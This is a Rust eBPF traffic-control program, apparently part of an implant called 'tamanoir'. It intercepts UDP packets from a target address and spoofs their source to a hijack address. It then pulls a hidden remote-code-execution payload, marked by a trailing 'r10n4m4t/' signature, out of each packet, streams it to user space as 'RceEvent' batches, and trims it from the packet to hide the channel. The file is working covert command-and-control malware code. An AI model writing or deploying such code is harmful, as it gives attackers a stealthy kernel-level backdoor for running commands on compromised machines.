use core::net::Ipv4Addr;

use aya_ebpf::{
    bindings::{TC_ACT_OK, TC_ACT_PIPE},
    helpers::bpf_skb_change_tail,
    macros::{classifier, map},
    maps::PerCpuArray,
    programs::TcContext,
};
use aya_log_ebpf::{debug, error, info};
use network_types::{
    eth::{EthHdr, EtherType},
    ip::{IpProto, Ipv4Hdr},
    udp::UdpHdr,
};
use tamanoir_common::{ContinuationByte, RceEvent};

use crate::common::{
    load_bytes, update_addr, update_ip_hdr_tot_len, update_udp_hdr_len, UpdateType, HIJACK_IP,
    IP_SRC_ADDR_OFFSET, RBUF, TARGET_IP, UDP_CSUM_OFFSET, UDP_OFFSET,
};

#[classifier]
pub fn tamanoir_ingress(mut ctx: TcContext) -> i32 {
    match tc_process_ingress(&mut ctx) {
        Ok(ret) => ret,
        Err(_) => TC_ACT_PIPE,
    }
}

#[inline]
fn submit(rce: RceEvent) {
    if let Some(mut buf) = RBUF.reserve::<RceEvent>(0) {
        unsafe { (*buf.as_mut_ptr()) = rce };
        buf.submit(0);
    }
}

pub struct Buf {
    pub buf: [u8; 512],
}

#[map]
pub static DNS_PAYLOAD_BUFFER: PerCpuArray<Buf> = PerCpuArray::with_max_entries(1, 0);

const AR_HEADER_SZ: usize = 13;
const FOOTER_TXT: &str = "r10n4m4t/";
const FOOTER_EXTRA_BYTES: usize = 3;
const FOOTER_LEN: usize = FOOTER_TXT.len() + FOOTER_EXTRA_BYTES;
const PAYLOAD_BATCH_LEN: usize = 32;

#[inline]
fn tc_process_ingress(ctx: &mut TcContext) -> Result<i32, i64> {
    let target_ip: u32 = unsafe { core::ptr::read_volatile(&TARGET_IP) };
    let hijack_ip: u32 = unsafe { core::ptr::read_volatile(&HIJACK_IP) };

    let ethhdr: EthHdr = ctx.load(0)?;
    if let EtherType::Ipv4 = ethhdr.ether_type {
        let header = ctx.load::<Ipv4Hdr>(EthHdr::LEN)?;
        let addr = header.src_addr;
        if let IpProto::Udp = header.proto {
            if u32::from_be(addr) == target_ip {
                info!(ctx, "\n-----\nNew intercepted request:\n-----");
                let udp_hdr = &ctx.load::<UdpHdr>(UDP_OFFSET)?;
                let udp_port = &udp_hdr.source;
                update_addr(ctx, &addr, &hijack_ip.to_be(), UpdateType::Src)?;

                ctx.l4_csum_replace(UDP_CSUM_OFFSET, addr as u64, hijack_ip as u64, 4)
                    .map_err(|_| {
                        error!(ctx, "error: l4_csum_replace");
                        -1
                    })?;

                let mut footer = [0u8; 2 * FOOTER_LEN]; // make verifier happy
                let _ = ctx.load_bytes(ctx.len() as usize - FOOTER_LEN, &mut footer)?;
                let footer = &footer[..FOOTER_LEN];

                let last_bytes_rtcp_trigger: [u8; FOOTER_TXT.len()] =
                    FOOTER_TXT.as_bytes().try_into().map_err(|_| 0)?;

                if footer[..FOOTER_TXT.len()] == last_bytes_rtcp_trigger {
                    debug!(ctx, " !! rce transmission !! ");
                    let continuation_byte =
                        ContinuationByte::from_u8(footer[footer.len() - FOOTER_EXTRA_BYTES])
                            .ok_or(0)?;
                    let payload_sz =
                        u16::from_le_bytes(footer[footer.len() - 2..].try_into().map_err(|_| 0)?)
                            as usize;

                    info!(ctx, "payload is {} bytes long", payload_sz);

                    let record_sz = AR_HEADER_SZ + payload_sz + FOOTER_LEN;
                    let payload_buf = unsafe {
                        let ptr = DNS_PAYLOAD_BUFFER.get_ptr_mut(0).ok_or(-1)?;
                        &mut (*ptr).buf
                    };
                    load_bytes(
                        ctx,
                        ctx.len() as usize - FOOTER_LEN - payload_sz,
                        payload_buf,
                    )?;
                    let mut consumed = 0;

                    let buf = unsafe {
                        let ptr = DNS_PAYLOAD_BUFFER.get_ptr(0).ok_or(-1)?;
                        &(*ptr).buf
                    };
                    let mut idx: usize = 0;

                    while consumed < payload_sz {
                        let batch = buf.get(idx..idx + PAYLOAD_BATCH_LEN).ok_or(0)?;
                        consumed += batch.len();

                        let is_first = idx == 0;
                        let is_last = consumed >= payload_sz;

                        let length = if is_last {
                            let extra_bytes_read = consumed.saturating_sub(payload_sz);
                            batch.len().saturating_sub(extra_bytes_read)
                        } else {
                            batch.len()
                        };
                        debug!(
                            ctx,
                            "\n{} bytes consumed from buffer @index {} (total consumed={})\ntotal payload size={}\n=>batch payload size is set to {} bytes",
                            batch.len(),
                            idx,
                            consumed,
                            payload_sz,
                            length
                        );
                        submit(RceEvent {
                            prog: batch.try_into().map_err(|_| 0)?,
                            event_type: continuation_byte,
                            length,
                            is_first_batch: is_first,
                            is_last_batch: is_last,
                        });
                        idx += batch.len();
                    }

                    unsafe {
                        bpf_skb_change_tail(
                            ctx.skb.skb,
                            ctx.len().saturating_sub(record_sz as u32),
                            0,
                        );
                    };
                    update_ip_hdr_tot_len(
                        ctx,
                        &header.tot_len,
                        &(u16::from_be(header.tot_len).saturating_sub(record_sz as u16)).to_be(),
                    )?;
                    update_udp_hdr_len(
                        ctx,
                        &(u16::from_be(udp_hdr.len).saturating_sub(record_sz as u16)).to_be(),
                    )?;
                }
                info!(
                    ctx,
                    "{}:{} -> {}:{}",
                    Ipv4Addr::from_bits(u32::from_be(addr)),
                    u16::from_be(*udp_port),
                    Ipv4Addr::from_bits(u32::from_be(ctx.load::<u32>(IP_SRC_ADDR_OFFSET).unwrap())),
                    u16::from_be(ctx.load::<u16>(UDP_OFFSET).unwrap()),
                );
            }
        };
    }

    Ok(TC_ACT_OK)
}
